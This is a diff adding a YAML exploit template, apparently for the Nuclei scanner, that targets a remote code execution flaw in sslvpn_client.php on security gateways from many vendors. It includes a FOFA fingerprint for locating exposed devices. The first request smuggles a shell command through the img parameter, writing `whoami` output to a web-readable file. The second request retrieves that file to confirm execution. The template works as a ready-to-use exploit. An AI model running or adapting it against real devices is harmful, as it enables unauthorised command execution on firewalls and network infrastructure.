@@ -1,0 +1,37 @@
+id: multi-vendor-security-device-rce
+
+info:
+  name: "H3C-下一代防火墙 明御安全网关 等多品牌安全设备sslvpn_client.php远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/webui/images/default/default/alert_close.jpg"
+      该漏洞影响多个安全厂商的设备，受影响安全产品包括：H3C-下一代防火墙、明御安全网关、MAIPU-安全网关、D-Link-下一代防火墙、Huawei-产品、迈普通信技术股份有限公司安全网关、博达通信-下一代防火墙、任天行网络安全管理系统/安全审计系统、安博通应用网关、烽火网络安全审计、瑞斯康达科技发展股份有限公司安全路由器、任子行网络安全审计系统、绿盟安全审计系统、深圳市鑫塔科技有限公司第二代防火墙、海康威视安全网关、优炫防火墙、SG-8000深度安全网关、网御星云上网行为管理系统、360上网行为审计系统
+  tags: H3C-下一代防火墙，明御安全网关
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/check.txt|ls HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+- raw:
+  - |
+    GET /sslvpn/check.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'tmp'
